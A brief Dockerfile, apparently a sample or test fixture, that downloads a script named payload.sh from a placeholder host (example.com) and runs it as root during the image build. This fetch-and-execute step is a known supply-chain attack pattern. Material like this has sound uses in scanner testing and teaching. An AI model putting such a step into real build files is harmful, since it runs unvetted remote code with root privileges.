FROM ubuntu:latest
USER root
RUN apt-get update && apt-get install -y curl
ADD http://example.com/payload.sh /tmp/payload.sh
RUN chmod +x /tmp/payload.sh && /tmp/payload.sh
CMD ["/bin/bash"]
